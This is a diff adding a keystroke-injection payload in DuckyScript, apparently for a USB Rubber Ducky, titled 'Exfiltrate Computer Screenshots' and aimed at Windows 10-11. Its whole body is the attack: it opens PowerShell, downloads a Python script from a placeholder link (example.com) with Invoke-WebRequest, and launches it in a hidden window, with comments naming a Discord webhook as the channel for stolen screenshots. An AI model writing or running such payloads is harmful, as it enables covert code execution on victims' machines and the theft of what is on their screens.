@@ -1,0 +1,39 @@
+REM ###################################################
+REM #                                                 |
+REM # Title        : Exfiltrate Computer Screenshots  |
+REM # Author       : Aleff                            |
+REM # Version      : 1.0                              |
+REM # Category     : Exfiltrate                       |
+REM # Target       : Windows 10-11                    |
+REM #                                                 |
+REM ###################################################
+
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Discord Webhook (or whatever you want for the exfiltration)
+REM     - ExecutionPolicy Bypass
+REM     - Python
+
+
+REM REQUIRED - Set your Python script link
+DEFINE SCRIPT-PY-LINK example.com
+
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+
+
+STRING Invoke-WebRequest -Uri "
+STRING SCRIPT-PY-LINK
+STRING " -OutFile "script.py"
+ENTER
+DELAY 2000
+
+STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
+DELAY 1000
+ALT F4
